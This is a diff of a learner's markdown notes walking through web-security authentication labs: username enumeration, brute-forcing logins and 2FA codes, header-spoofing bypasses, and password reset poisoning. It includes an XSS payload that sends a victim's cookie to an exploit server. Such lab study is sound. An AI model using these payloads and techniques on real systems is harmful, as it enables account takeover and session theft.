@@ -16,7 +16,7 @@ In this section, we explain:
 - How you can make your own authentication mechanisms as robust as possible.
 ```
 
-![](Pasted image 20240918171637.png)
+![](Pasted%20image%2020240918171637.png)
 
 
 ## What is the difference between authentication and authorization?
@@ -70,25 +70,25 @@ Username enumeration typically occurs either on the login page, for example, whe
 
 #### LAB
 
-![](Pasted image 20240918172832.png)
+![](Pasted%20image%2020240918172832.png)
 Once we get the wordlist, we can brute force it either using the burp intruder, or, hydra:
 
 
 
-![](Pasted image 20240918173325.png)
+![](Pasted%20image%2020240918173325.png)
 We got the request, lets brute force our way in!:
 
-![](Pasted image 20240918181253.png)
+![](Pasted%20image%2020240918181253.png)
 
 
 username `amarillo` got a different length than the others, we might know now that, `amarillo` is our username based on response size, and the response itself, lets find password using same method:
 
-![](Pasted image 20240918181850.png)
+![](Pasted%20image%2020240918181850.png)
 
 Password is: `letmein`
 
 
-![](Pasted image 20240918181939.png)
+![](Pasted%20image%2020240918181939.png)
 
 
 
@@ -100,17 +100,17 @@ If the user is first prompted to enter a password, and then prompted to enter a 
 
 ##### LAB
 
-![](Pasted image 20240918182749.png)
+![](Pasted%20image%2020240918182749.png)
 When we login, we need a code sent to our email, if we go to email client, we get this:
 
-![](Pasted image 20240918183415.png)
+![](Pasted%20image%2020240918183415.png)
 Now we are at this panel and have this in the url:
 
-![](Pasted image 20240918183520.png)
+![](Pasted%20image%2020240918183520.png)
 
 If we try to log in carlos account, we will need his email, but we can bypass it by changing the last part of the URL to `my-account`:
 
-![](Pasted image 20240918183638.png)
+![](Pasted%20image%2020240918183638.png)
 
 
 ## Vulnerabilities in password-based login
@@ -123,27 +123,27 @@ This can be achieved in a number of ways. The following sections show how an att
 
 ### LAB
 
-![](Pasted image 20240924132822.png)
+![](Pasted%20image%2020240924132822.png)
 
 To begin with, we must do a little adjustment to our burp suite intruder, we need to use `grep-extract` to get our error message from the request in the following way:
 
-![](Pasted image 20240924165753.png)
-![](Pasted image 20240924165804.png)
+![](Pasted%20image%2020240924165753.png)
+![](Pasted%20image%2020240924165804.png)
 Now, lets start the attack, I don't have the image but I also loaded in the user.txt file into the attack:
 
-![](Pasted image 20240924172441.png)
+![](Pasted%20image%2020240924172441.png)
 Username `americas` has a slightly different warning than the others, we could assume this is our username, lets brute force the password:
-![](Pasted image 20240924173635.png)
+![](Pasted%20image%2020240924173635.png)
 Password is: `computer`
 
 Lets authenticate:
 
-![](Pasted image 20240924173740.png)
-![](Pasted image 20240924173817.png)
+![](Pasted%20image%2020240924173740.png)
+![](Pasted%20image%2020240924173817.png)
 
 ### LAB
 
-![](Pasted image 20240925125637.png)
+![](Pasted%20image%2020240925125637.png)
 This lab contains some sort of IP anti brute force control that we must bypass, to do this, we must add the following header into our request:
 
 `X-Forwarded-For:`
@@ -152,22 +152,22 @@ If we check on the response time each request takes, we are able to identify tha
 
 
 
-![](Pasted image 20240925130823.png)
+![](Pasted%20image%2020240925130823.png)
 Add the X-Forwarded-For position in our intruder and the following payload:
 
-![](Pasted image 20240925130920.png)
+![](Pasted%20image%2020240925130920.png)
 We will also need to add a second position for our usernames, like this:
 
-![](Pasted image 20240925131043.png)
-![](Pasted image 20240925131051.png)
-![](Pasted image 20240925144829.png)
+![](Pasted%20image%2020240925131043.png)
+![](Pasted%20image%2020240925131051.png)
+![](Pasted%20image%2020240925144829.png)
 We got username `adserver`, password is:
-![](Pasted image 20240925144855.png)
+![](Pasted%20image%2020240925144855.png)
 `thomas
 
 Just like that, we finished the lab:
 
-![](Pasted image 20240925144938.png)
+![](Pasted%20image%2020240925144938.png)
 
 
 ## Flawed brute-force protection
@@ -293,12 +293,12 @@ This is extremely dangerous if the attacker is then able to brute-force the veri
 
 #### LAB
 
-![](Pasted image 20240926164118.png)
+![](Pasted%20image%2020240926164118.png)
 
 We need to send the login2 request to repeater and send the verify option for carlos username, this ensures that a code for the username `carlos` is being sent:
 
 
-![](Pasted image 20240926164910.png)
+![](Pasted%20image%2020240926164910.png)
 
 
 Once we've sent the request, we need to brute force the security code, for this, i used the following:
@@ -311,18 +311,18 @@ Once we've sent the request, we need to brute force the security code, for this,
 
 I used that wfuzz command, it bruteforces the 2FA code and gives it to me:
 
-![](Pasted image 20240926171117.png)
+![](Pasted%20image%2020240926171117.png)
 
 
 So, 2FA code is `0574
 
 Lets try to authenticate using username carlos:
-![](Pasted image 20240926171143.png)
+![](Pasted%20image%2020240926171143.png)
 
 And we´re in:
 
-![](Pasted image 20240926171222.png)
-![](Pasted image 20240926171306.png)
+![](Pasted%20image%2020240926171222.png)
+![](Pasted%20image%2020240926171306.png)
 
 
 ### Brute-forcing 2FA verification codes
@@ -350,14 +350,14 @@ Even if the attacker is not able to create their own account, they may still be 
 
 #### LAB
 
-![](Pasted image 20240927125009.png)
+![](Pasted%20image%2020240927125009.png)
 
 Request:
 
-![](Pasted image 20240927130212.png)
+![](Pasted%20image%2020240927130212.png)
 If we use inspector tool from burp, we can see the base in which the stay-logged-in cookie is constructed:
 
-![](Pasted image 20240927130256.png)
+![](Pasted%20image%2020240927130256.png)
 
 It follows this structure:
 `
@@ -365,25 +365,25 @@ It follows this structure:
 
 
 So, we need to send that request to intruder and do this:
-![](Pasted image 20240927131642.png)
+![](Pasted%20image%2020240927131642.png)
 
 
-![](Pasted image 20240927130807.png)
-![](Pasted image 20240927130815.png)
-![](Pasted image 20240927132128.png)
+![](Pasted%20image%2020240927130807.png)
+![](Pasted%20image%2020240927130815.png)
+![](Pasted%20image%2020240927132128.png)
 Just like that we completed the lab:
 
-![](Pasted image 20240927132204.png)
+![](Pasted%20image%2020240927132204.png)
 ### Keeping users logged in - Continued
 
 In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.
 
 ##### LAB
 
-![](Pasted image 20240927132951.png)
+![](Pasted%20image%2020240927132951.png)
 As the description says, this lab is vulnerable to `XSS` in the comment section:
 
-![](Pasted image 20240927133904.png)
+![](Pasted%20image%2020240927133904.png)
 
 We can enter a payload to steal an user's cookie:
 
@@ -391,10 +391,10 @@ We can enter a payload to steal an user's cookie:
 <script>document.location='//exploit-0a5100b30484ebb2802716e9011800cb.exploit-server.net/'+document.cookie</script>
 ```
 
-![](Pasted image 20240927134249.png)
+![](Pasted%20image%2020240927134249.png)
 If we go to our exploit server logs, we can see this:
 
-![](Pasted image 20240927134413.png)
+![](Pasted%20image%2020240927134413.png)
 Seems like a secret (cookie) from our victim:
 
 
@@ -406,11 +406,11 @@ Seems like a secret (cookie) from our victim:
 
 If we decode the stay-logged-in cookie:
 
-![](Pasted image 20240927134607.png)
-![](Pasted image 20240927134616.png)
+![](Pasted%20image%2020240927134607.png)
+![](Pasted%20image%2020240927134616.png)
 Like that, we got carlos user password!:
 
-![](Pasted image 20240927134712.png)
+![](Pasted%20image%2020240927134712.png)
 
 
 ### Resetting user passwords
@@ -445,30 +445,30 @@ However, some websites fail to also validate the token again when the reset form
 
 ##### LAB 1
 
-![](Pasted image 20241001125644.png)
+![](Pasted%20image%2020241001125644.png)
 The moment I went to change my password, I got this request:
 
-![](Pasted image 20241001132822.png)
+![](Pasted%20image%2020241001132822.png)
 That's when I changed the username value from `wiener` to `carlos`, I got 302 request code, let's see if it changed carlos password:
 
-![](Pasted image 20241001134344.png)
+![](Pasted%20image%2020241001134344.png)
 
 
 If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it change their password. 
 
 ##### LAB 2
-![](Pasted image 20241001134523.png)
+![](Pasted%20image%2020241001134523.png)
 
 For this lab, we must modify the following request:
 
-![](Pasted image 20241001141030.png)
+![](Pasted%20image%2020241001141030.png)
 As the lab said, we must steal carlos token to reset his password, for this, I modified the request with the following header:
 
 `X-Forwarded-Host`
 
 Simple explanation of this header:
 
-![](Pasted image 20241001141510.png)
+![](Pasted%20image%2020241001141510.png)
 
 
 I used it like this:
@@ -477,17 +477,17 @@ I used it like this:
 
 I used the URL from my exploit server, also, modified request looks like this:
 
-![](Pasted image 20241001141620.png)
+![](Pasted%20image%2020241001141620.png)
 
 If we go to our exploit server logs, we can see this:
 
-![](Pasted image 20241001141818.png)
+![](Pasted%20image%2020241001141818.png)
 
 Seems like carlos clicked on the link and we got his password token, now, let's change his password:
 
 
-![](Pasted image 20241001142152.png)
-![](Pasted image 20241001143728.png)
+![](Pasted%20image%2020241001142152.png)
+![](Pasted%20image%2020241001143728.png)
 Like that, we finished the lab.
 
 ### Changing user passwords
@@ -499,31 +499,31 @@ Password change functionality can be particularly dangerous if it allows an atta
 
 #### LAB
 
-![](Pasted image 20241001144341.png)
+![](Pasted%20image%2020241001144341.png)
 
 When we go and change our password using our own account, we get this request:
 
-![](Pasted image 20241001145039.png)
+![](Pasted%20image%2020241001145039.png)
 If we set different values for password1 and password 2, we get the message:
 
 `New passowrds do not match`
 
 Knowing this, we can brute force carlos password in the following way:
 
-![](Pasted image 20241001145201.png)
+![](Pasted%20image%2020241001145201.png)
 
 When we got our payload set, we need to add a grep match condition, which is the `New passwords do not match` flag we get when our current password is correct but, our new passwords are different:
 
-![](Pasted image 20241001145300.png)
+![](Pasted%20image%2020241001145300.png)
 
 Let's launch the attack:
 
 
-![](Pasted image 20241001164920.png)
+![](Pasted%20image%2020241001164920.png)
 
 Carlos password is taylor, let's log in:
 
-![](Pasted image 20241001165027.png)
+![](Pasted%20image%2020241001165027.png)
 
 
 
